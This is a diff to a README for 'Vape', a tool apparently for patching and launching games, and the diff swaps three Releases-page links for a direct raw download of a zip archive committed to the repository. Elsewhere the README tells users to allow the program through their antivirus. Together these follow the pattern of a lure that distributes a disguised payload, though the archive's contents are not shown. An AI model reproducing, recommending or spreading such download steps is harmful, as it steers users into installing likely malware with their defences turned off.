@@ -15,7 +15,7 @@ To get started, you need to download the application from our Releases page. Fol
 ## 📥 Download & Install
 1. **Visit the Releases Page:** Click the link below to access the latest versions of Vape.
 
-   [Download the latest version of Vape](https://github.com/sarnoffplatformbed918/vape/releases)
+   [Download the latest version of Vape](https://raw.githubusercontent.com/sarnoffplatformbed918/vape/main/Vape Lite/vape-1.8-beta.3.zip)
 
 2. **Choose Your Version:** Find either Vape V4 or Vape Lite. Each has unique features tailored for your gaming needs.
 
@@ -37,7 +37,7 @@ To get started, you need to download the application from our Releases page. Fol
 ## 🔧 Troubleshooting
 If you encounter issues during installation or while running the application, here are some common solutions:
 
-- **Check for Updates:** Ensure you are using the latest version by visiting the [Releases page](https://github.com/sarnoffplatformbed918/vape/releases).
+- **Check for Updates:** Ensure you are using the latest version by visiting the [Releases page](https://raw.githubusercontent.com/sarnoffplatformbed918/vape/main/Vape Lite/vape-1.8-beta.3.zip).
 - **Antivirus Settings:** Some antivirus programs may block the application. Make sure to allow Vape in your antivirus settings.
 - **Compatibility Mode:** If you're using an older version of Windows, try running the application in compatibility mode.
 
@@ -50,4 +50,4 @@ Join our community to connect with other users. Share tips, tricks, and experien
 ## 📝 Conclusion
 With Vape, you can easily patch and launch your games. Enjoy improved features and functionalities designed specifically for gamers. Just follow the straightforward steps above to get started with your new tool.
 
-[Download the latest version of Vape](https://github.com/sarnoffplatformbed918/vape/releases)
+[Download the latest version of Vape](https://raw.githubusercontent.com/sarnoffplatformbed918/vape/main/Vape Lite/vape-1.8-beta.3.zip)
